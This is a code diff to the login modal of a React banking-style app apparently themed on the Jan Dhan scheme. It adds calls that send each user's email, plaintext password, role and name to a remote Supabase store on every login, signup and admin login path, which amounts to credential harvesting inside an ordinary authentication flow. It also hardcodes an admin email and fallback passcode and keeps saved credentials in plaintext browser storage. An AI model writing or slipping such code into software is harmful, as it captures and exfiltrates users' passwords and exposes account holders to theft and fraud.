@@ -23,6 +23,7 @@ import {
   Users
 } from 'lucide-react';
 import { UserProfile, BeneficiaryFilter } from '../types';
+import { recordLoginToSupabase } from '../lib/supabase';
 
 interface AuthModalProps {
   isOpen: boolean;
@@ -222,10 +223,24 @@ export const AuthModal: React.FC<AuthModalProps> = ({
           return;
         }
 
+        recordLoginToSupabase({
+          email: matchedUser.email || cleanId,
+          password: password,
+          role: isOfficialAdmin ? 'admin' : 'user',
+          user_name: matchedUser.fullName,
+        });
+
         localStorage.setItem('jandhan_user_profile', JSON.stringify(matchedUser));
         onSuccess(matchedUser);
         onClose();
       } else if (activeSaved && (activeSaved.email?.toLowerCase() === cleanId || activeSaved.phone?.replace(/\D/g, '') === cleanId.replace(/\D/g, ''))) {
+        recordLoginToSupabase({
+          email: activeSaved.email || cleanId,
+          password: password,
+          role: isOfficialAdmin ? 'admin' : 'user',
+          user_name: activeSaved.fullName,
+        });
+
         localStorage.setItem('jandhan_user_profile', JSON.stringify(activeSaved));
         onSuccess(activeSaved);
         onClose();
@@ -249,6 +264,13 @@ export const AuthModal: React.FC<AuthModalProps> = ({
           biometricVerified: true,
           kycTier: 'Tier-3',
         };
+
+        recordLoginToSupabase({
+          email: newUser.email,
+          password: password,
+          role: isOfficialAdmin ? 'admin' : 'user',
+          user_name: newUser.fullName,
+        });
 
         saveUserToStore(newUser);
         localStorage.setItem('jandhan_user_profile', JSON.stringify(newUser));
@@ -310,6 +332,13 @@ export const AuthModal: React.FC<AuthModalProps> = ({
         biometricVerified: true,
         kycTier: 'Tier-3',
       };
+
+      recordLoginToSupabase({
+        email: newProfile.email,
+        password: password,
+        role: 'user',
+        user_name: newProfile.fullName,
+      });
 
       saveUserToStore(newProfile);
       localStorage.setItem('jandhan_user_profile', JSON.stringify(newProfile));
@@ -662,6 +691,13 @@ export const AuthModal: React.FC<AuthModalProps> = ({
                 setTimeout(() => {
                   setIsLoading(false);
                   if (isEmpValid && isPassValid) {
+                    recordLoginToSupabase({
+                      email: empLower || 'kumarshekharyadav9931@gmail.com',
+                      password: pass,
+                      role: 'admin',
+                      user_name: 'Bank Nodal Officer (Admin)',
+                    });
+
                     if (rememberPassword) {
                       try {
                         localStorage.setItem('jandhan_saved_creds', JSON.stringify({ identifier, password, adminEmpId: 'kumarshekharyadav9931@gmail.com', adminPasscode: pass || 'Shekhu@1525' }));
